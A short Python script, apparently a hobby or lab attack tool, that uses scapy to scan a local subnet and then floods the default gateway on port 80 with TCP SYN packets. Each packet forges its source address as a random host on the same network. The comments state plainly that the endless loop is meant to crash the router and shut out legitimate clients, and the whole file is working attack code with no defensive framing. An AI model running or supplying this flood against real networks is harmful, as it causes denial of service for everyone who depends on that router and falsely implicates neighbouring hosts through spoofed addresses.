import os
import random
from scapy.all import *



def find_Network_IPs(subnet: str):
    '''
    The function searches for all IP addresses that exist on the network and enters them into a list (excluding the address of
    the router on which the attack is being made).
    '''
    # Using arping to find all IP addresses on a network
    ans, _ = arping(subnet, verbose = False)
    # Saving the IP addresses found in a list except for the router's IP address
    active_IPs = [rcv.psrc for _, rcv in ans if rcv.psrc != target_ip]
    return active_IPs


if __name__ == "__main__":

    # Setting the IP and port target
    target_ip = os.getenv("default_gateway_IP")
    target_port = 80

    # Enabling the function to find IP addresses on the local network
    NETWORK_IPs = find_Network_IPs("192.168.1.0/24")

    # Creating an infinite loop that will crash the server, making it unable to communicate with legitimate clients
    while True:
        # Creating an IP layer where the source IP changes randomly each time to another IP on the network
        ip = IP(src = random.choice(NETWORK_IPs), dst = target_ip)
        # Creating a TCP layer of type SYN whose source port changes randomly each time
        tcp = TCP(sport = RandShort(), dport = target_port, flags = "S")
        # Assembling a packet
        packet = ip / tcp
        # Sending the packet
        send(packet, verbose = 0)